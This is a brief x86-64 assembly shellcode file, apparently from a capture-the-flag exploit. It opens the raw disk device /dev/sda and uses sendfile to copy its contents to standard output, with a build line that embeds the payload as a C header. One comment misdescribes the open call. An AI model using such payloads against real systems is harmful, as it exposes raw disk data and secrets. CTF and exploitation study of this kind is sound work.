; nasm -f bin ./readflag.S && xxd -i readflag > readflag.h
BITS 64
  ; call open('rsp', 'O_RDONLY', 'rdx')
  push 2 ; SYS_open
  pop rax
  lea rdi, [rel flag_file]
  xor esi, esi ; O_RDONLY
  syscall
  ; call sendfile(1, 'rax', 0, 0x7fffffff)
  mov r10d, 0x7fffffff
  mov rsi, rax
  push 0x28 ; SYS_sendfile
  pop rax
  push 1
  pop rdi
  cdq ; rdx=0
  syscall
  ; exit(status=0)
  xor edi, edi ; 0
  ; call exit()
  push 0x3c ; SYS_exit
  pop rax
  syscall

flag_file:
  db "/dev/sda", 0
